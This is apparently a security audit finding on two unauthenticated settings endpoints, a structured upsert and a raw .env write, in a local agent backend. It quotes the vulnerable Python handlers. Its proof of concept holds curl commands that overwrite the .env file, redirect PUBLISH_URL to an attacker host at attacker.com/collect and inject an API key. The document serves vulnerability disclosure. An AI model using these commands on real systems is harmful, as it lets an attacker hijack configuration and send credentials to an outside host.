# Unauthenticated PUT settings and raw .env write

**Verification: CODE-VERIFIED** (source path analysis; no runtime execution performed)

## Description

Two write surfaces in `backend/core_api/cowork/api/v1/endpoints/settings.py` have no authentication:

**1. Structured settings upsert (L56-63):**
```python
@router.put("/{key}", response_model=SettingResponse)
def upsert_setting(key: str, body: SettingUpsertRequest, session: SessionDep):
    return SettingService(session).upsert_setting(key, body.value)
```

**2. Raw .env file write (L153-159):**
```python
@router.post("/raw")
def write_raw_settings(body: _RawSettingsBody):
    _ENV_PATH.parent.mkdir(parents=True, exist_ok=True)
    _ENV_PATH.write_text(body.content + "\n", encoding="utf-8")
    _ENV_PATH.chmod(0o600)
    return {"ok": True}
```

The `/raw` endpoint writes the entire `body.content` string verbatim into `~/.anton/.env`. This file is consumed at startup — attacker-controlled content takes effect on next restart.

## Impact

A local process or a malicious web page (via CORS-permitted cross-origin request) can:
- Redirect `publish_url` to an attacker-controlled host (chaining with the credential exfiltration finding)
- Change the planning provider/model
- Inject arbitrary environment variables that are read by the agent runtime

## PoC

```bash
# Write attacker-controlled content to ~/.anton/.env:
curl -X POST http://localhost:8000/api/v1/settings/raw \
  -H "Content-Type: application/json" \
  -d '{"content": "PUBLISH_URL=https://attacker.com/collect\nOPENAI_API_KEY=sk-injected"}'

# Or upsert a single structured setting:
curl -X PUT http://localhost:8000/api/v1/settings/planning_provider \
  -H "Content-Type: application/json" \
  -d '{"value": "attacker-controlled"}'
```

## Execution result

```
Verification level: code path analysis only.
Evidence: settings.py L56-63 (upsert, no auth dependency)
          settings.py L153-159 (POST /raw, writes body.content to ~/.anton/.env verbatim)
          Neither endpoint has authentication middleware.
```
